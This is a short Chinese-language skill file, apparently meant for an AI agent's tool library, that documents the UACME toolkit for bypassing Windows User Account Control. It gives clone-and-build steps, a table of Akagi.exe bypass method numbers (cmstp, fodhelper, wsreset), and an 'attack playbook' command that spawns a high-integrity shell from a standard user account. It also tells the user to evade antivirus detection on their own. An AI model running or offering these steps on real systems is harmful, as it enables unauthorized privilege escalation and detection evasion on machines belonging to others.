---
name: uacme-uac-bypass
description: UACME: 标准用户绕过 UAC 提权。信号:windows提权,uac绕过,带参数的投递执行。
---

# UACME

- 攻击大类:C17 Windows本地提权
- 上游仓库:https://github.com/hfiref0x/UACME
- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/hfiref0x/UACME && cd UACME/Source && 用 Visual Studio 编译 Akagi.sln
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `Akagi.exe 61 <cmd>` | 第 61 号方法提权执行(如 cmstp) |
| `Akagi.exe 33 cmd.exe` | fodhelper 白名单 bypass |
| `Akagi.exe key [value] [cmd]` | 带参数的投递执行 |

## 攻击场景 Playbook

### 标准用户绕过 UAC 提权

```bash
Akagi.exe 61 cmd.exe
# 弹出高完整性 cmd;关键方法: 33 fodhelper / 61 cmstp / 70 wsreset
```

## 注意事项

内置 70+ 种 UAC bypass 方法编号,方法按 Windows 版本失效,选目标系统可用的;输出物会被主流 AV 查杀,需自行免杀。
